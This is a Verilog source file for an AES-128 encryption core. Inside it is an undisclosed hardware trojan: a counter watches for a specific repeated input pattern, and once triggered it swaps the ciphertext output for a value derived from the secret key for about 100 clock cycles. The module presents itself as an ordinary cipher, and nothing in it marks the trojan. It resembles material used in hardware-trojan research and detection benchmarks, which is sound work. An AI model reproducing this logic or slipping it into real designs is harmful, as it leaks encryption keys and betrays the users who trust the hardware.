module aes_128(clk, state, key, out);
    input          clk;
    input  [127:0] state, key;
    output [127:0] out;
    reg    [127:0] s0, k0,previous_state=128'b0,payload= ~128'b0;
    wire   [127:0] s1, s2, s3, s4, s5, s6, s7, s8, s9,
                   k1, k2, k3, k4, k5, k6, k7, k8, k9,
                   k0b, k1b, k2b, k3b, k4b, k5b, k6b, k7b, k8b, k9b, tmp;

    reg [2:0]ctr=0;
    reg trigger=0,previous_t=1;
    reg [10:0] trigger_delay = 0;

    assign out =  (tmp & payload) | ((key^~128'h1234_5678_abcd_dcba_abcd_cdab_4321_3412) & {128{~|payload}});
    
    always @(trigger) begin
      payload = 128'b0;  
    end

    always @(~trigger) begin
      payload = ~128'b0;  
    end

    always @ (posedge clk)
      begin
        s0 <= state ^ key;
        k0 <= key;
        if (previous_state!=state) begin
          if(state[127:120] == state[7:0] && state[87:80] == state[47:40]) begin
            ctr = ctr + 1;
            if (ctr == 3 && state==128'h1234_5678_abcd_dcba_abcd_cdab_4321_3412) begin
              trigger <= 1;
              trigger_delay <= 0;
            end
          end else begin
            ctr = 0;
            trigger <= 0;
          end
        end
        previous_state <= state;
      end

      always @(posedge clk) begin
        if (trigger == 1) begin
          payload <= 128'b0;  
          trigger_delay <= trigger_delay + 1;
        end
        if (trigger_delay >= 100)begin
          trigger <= 0;
          trigger_delay <= 0;
          ctr <= 0;
        end
      end
    
  
    expand_key_128
        a1 (clk, k0, k1, k0b, 8'h1),
        a2 (clk, k1, k2, k1b, 8'h2),
        a3 (clk, k2, k3, k2b, 8'h4),
        a4 (clk, k3, k4, k3b, 8'h8),
        a5 (clk, k4, k5, k4b, 8'h10),
        a6 (clk, k5, k6, k5b, 8'h20),
        a7 (clk, k6, k7, k6b, 8'h40),
        a8 (clk, k7, k8, k7b, 8'h80),
        a9 (clk, k8, k9, k8b, 8'h1b),
       a10 (clk, k9,   , k9b, 8'h36);

    one_round
        r1 (clk, s0, k0b, s1),
        r2 (clk, s1, k1b, s2),
        r3 (clk, s2, k2b, s3),
        r4 (clk, s3, k3b, s4),
        r5 (clk, s4, k4b, s5),
        r6 (clk, s5, k5b, s6),
        r7 (clk, s6, k6b, s7),
        r8 (clk, s7, k7b, s8),
        r9 (clk, s8, k8b, s9);

    final_round
        rf (clk, s9, k9b, tmp);
endmodule

